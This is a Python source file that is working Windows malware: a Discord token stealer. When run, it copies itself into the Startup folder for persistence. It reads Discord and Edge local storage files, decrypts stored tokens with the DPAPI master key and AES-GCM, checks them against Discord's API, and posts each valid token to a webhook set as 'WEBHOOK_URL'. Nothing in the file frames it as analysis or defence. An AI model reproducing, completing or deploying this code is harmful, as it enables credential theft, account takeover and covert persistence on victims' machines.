from ctypes import windll, wintypes, byref, cdll, Structure, POINTER, c_char, c_buffer
from urllib.request import Request, urlopen
import os, threading, shutil, sys, re
from json import loads as json_loads
from Crypto.Cipher import AES
from base64 import b64decode
from json import *


webhook = "WEBHOOK_URL"



local = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')
temp = os.getenv("TEMP")

Threadlist = []


class DATA_BLOB(Structure):
    _fields_ = [
        ('cbData', wintypes.DWORD),
        ('pbData', POINTER(c_char))
    ]


def GetData(blob_out):
    cbData = int(blob_out.cbData)
    pbData = blob_out.pbData
    buffer = c_buffer(cbData)
    cdll.msvcrt.memcpy(buffer, pbData, cbData)
    windll.kernel32.LocalFree(pbData)
    return buffer.raw


def CryptUnprotectData(encrypted_bytes, entropy=b''):
    buffer_in = c_buffer(encrypted_bytes, len(encrypted_bytes))
    buffer_entropy = c_buffer(entropy, len(entropy))
    blob_in = DATA_BLOB(len(encrypted_bytes), buffer_in)
    blob_entropy = DATA_BLOB(len(entropy), buffer_entropy)
    blob_out = DATA_BLOB()
    if windll.crypt32.CryptUnprotectData(byref(blob_in), None, byref(blob_entropy), None, None, 0x01, byref(blob_out)):
        return GetData(blob_out)


def DecryptValue(buff, master_key=None):
    starts = buff.decode(encoding='utf8', errors='ignore')[:3]
    if starts == 'v10' or starts == 'v11':
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass


def LoadUrlib(webhook, data='', headers=''):
        try:
            if headers != '':
                r = urlopen(Request(webhook, data=data, headers=headers))
                return r
            else:
                r = urlopen(Request(webhook, data=data))
                return r
        except:
            pass


def ChekToken(token):
    headers = {
        "Authorization": token,
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }
    try:
        urlopen(Request("https://discordapp.com/api/v6/users/@me", headers=headers))
        return True
    except:
        return False


if getattr(sys, 'frozen', False):
    currentFilePath = os.path.dirname(sys.executable)
else:
    currentFilePath = os.path.dirname(os.path.abspath(__file__))
fileName = os.path.basename(sys.argv[0])
filePath = os.path.join(currentFilePath, fileName)
startupFolderPath = os.path.join(os.path.expanduser('~'), 'AppData', 'Roaming', 'Microsoft', 'Windows', 'Start Menu',
                                 'Programs', 'Startup')
startupFilePath = os.path.join(startupFolderPath, fileName)
if os.path.abspath(filePath).lower() != os.path.abspath(startupFilePath).lower():
    with open(filePath, 'rb') as src_file, open(startupFilePath, 'wb') as dst_file:
        shutil.copyfileobj(src_file, dst_file)


def UploadToken(token):
    global webhook
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:102.0) Gecko/20100101 Firefox/102.0"
    }

    data = {
        "content": f'{token}',
    }
    LoadUrlib(webhook, data=dumps(data).encode(), headers=headers)

Tokens = ''

def getToken(path, arg):
    if not os.path.exists(path): return
    path += arg
    for file in os.listdir(path):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [x.strip() for x in open(f"{path}\\{file}", errors="ignore").readlines() if x.strip()]:
                for regex in (r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}", r"mfa\.[\w-]{80,95}"):
                    for token in re.findall(regex, line):
                        global Tokens
                        if ChekToken(token):
                            if not token in Tokens:
                                Tokens += token
                                UploadToken(token)


def GetDiscord(path, arg):
    if not os.path.exists(f"{path}/Local State"): return
    pathC = path + arg
    pathKey = path + "/Local State"
    with open(pathKey, 'r', encoding='utf-8') as f:
        local_state = json_loads(f.read())
    master_key = b64decode(local_state['os_crypt']['encrypted_key'])
    master_key = CryptUnprotectData(master_key[5:])
    for file in os.listdir(pathC):
        if file.endswith(".log") or file.endswith(".ldb"):
            for line in [x.strip() for x in open(f"{pathC}\\{file}", errors="ignore").readlines() if x.strip()]:
                for token in re.findall(r"dQw4w9WgXcQ:[^.*\['(.*)'\].*$][^\"]*", line):
                    global Tokens
                    tokendecod = DecryptValue(b64decode(token.split('dQw4w9WgXcQ:')[1]), master_key)
                    if ChekToken(tokendecod):
                        if not tokendecod in Tokens:
                            Tokens += tokendecod

                            UploadToken(tokendecod)


def GatherAll():
    browserPath = [
        [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default",
         "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn"]
    ]
    discordPaths = [
        [f"{roaming}/Discord", "/Local Storage/leveldb"],
        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
    ]
    for patt in browserPath:
        a = threading.Thread(target=getToken, args=[patt[0], patt[2]])
        a.start()
        Threadlist.append(a)
    for patt in discordPaths:
        a = threading.Thread(target=GetDiscord, args=[patt[0], patt[1]])
        a.start()
        Threadlist.append(a)

GatherAll()
